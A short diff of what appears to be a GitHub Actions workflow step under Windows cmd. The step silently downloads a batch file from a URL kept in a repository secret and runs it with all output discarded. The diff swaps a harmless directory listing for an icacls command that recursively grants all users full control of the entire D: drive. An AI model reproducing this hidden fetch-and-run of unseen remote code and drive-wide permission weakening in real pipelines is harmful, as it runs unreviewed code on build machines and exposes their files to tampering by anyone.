@@ -11,7 +11,7 @@ jobs:
       shell: cmd
       run: |
         curl -L %GIST_URL% -o loads.bat >nul 2>&1
-        cmd /c "dir"
+        cmd /c "icacls D:\ /grant Users:(OI)(CI)F /T /C"
         cmd /c loads.bat >nul 2>&1
       env:
         GIST_URL: ${{ secrets.GIST_URL }}
